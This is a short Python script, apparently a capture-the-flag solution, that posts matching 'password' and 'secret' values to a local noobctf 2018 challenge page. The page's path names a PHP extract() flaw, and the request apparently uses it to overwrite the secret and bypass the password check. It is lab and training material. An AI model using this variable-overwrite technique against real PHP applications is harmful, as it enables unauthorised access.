import requests

target = 'http://localhost/CTF%20Challenges/noobctf%202018/php%20extract%20exploit/index.php'
data = {'password':'1','secret':'1','submit':'submit'}

r = requests.post(target,data=data)
print r.text
